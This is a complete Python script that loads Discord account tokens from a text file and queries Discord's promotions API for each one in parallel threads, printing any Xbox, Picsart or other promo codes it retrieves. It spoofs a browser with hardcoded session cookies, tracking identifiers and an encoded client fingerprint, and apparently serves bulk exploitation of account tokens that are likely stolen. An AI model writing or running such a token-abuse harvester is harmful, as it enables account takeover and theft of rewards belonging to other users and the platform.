import requests, colorama, threading
lock = threading.Lock()
def log(text):lock.acquire();print(text+f"{colorama.Fore.RESET}");lock.release()
def check_token(token):
    sex = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-US", headers={"accept": "*/*","accept-encoding": "gzip, deflate, br","accept-language": "en-US,en;q=0.9","authorization": token,"cookie": "__dcfduid=88221810e37411ecb92c839028f4e498; __sdcfduid=88221811e37411ecb92c839028f4e498dc108345b16a69b7966e1b3d33d2182268b3ffd2ef5dfb497aef45ea330267cf; locale=en-US; OptanonConsent=isIABGlobal=false&datestamp=Fri+Jun+03+2022+15%3A36%3A59+GMT-0400+(Eastern+Daylight+Time)&version=6.33.0&hosts=&landingPath=https%3A%2F%2Fdiscord.com%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1; __stripe_mid=3a915c95-4cf7-4d27-9d85-cfea03f7ce829a88e5; __stripe_sid=b699111a-a911-402d-a08a-c8801eb0f2e8baf912; __cf_bm=nEUsFi1av6PiX4cHH1PEcKFKot6_MslL4UbUxraeXb4-1654285264-0-AU8vy1OnS/uTMTGu2TbqIGYWUreX3IAEpMo++NJZgaaFRNAikwxeV/gxPixQ/DWlUyXaSpKSNP6XweSVG5Mzhn/QPdHU3EmR/pQ5K42/mYQaiRRl6osEVJWMMtli3L5iIA==","referer": "https://discord.com/channels/967617613960187974/981260247807168532","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36","x-discord-locale": "en-US","x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMi4wLjUwMDUuNjEgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjEwMi4wLjUwMDUuNjEiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTMwNDEwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}) 
    data = sex.json()
    if "xbox" in sex.text.lower(): code = data[0]["code"];log(f"{colorama.Fore.GREEN}Xbox Code: {code}")
    elif "picsart" in sex.text.lower():code = data[0]["code"];log(f"{colorama.Fore.YELLOW}Picsart code: {code}")
    else:
        if data != []: code = data[0]["code"]; log(f"{colorama.Fore.YELLOW}Other code: {code}")
def start():
    with open("tokens.txt", "r") as f:  tokens = f.read().splitlines()
    threads = []
    for token in tokens: threads.append(threading.Thread(target=check_token, args=(token,)))
    for thread in threads: thread.start()
    for thread in threads: thread.join()       
start()
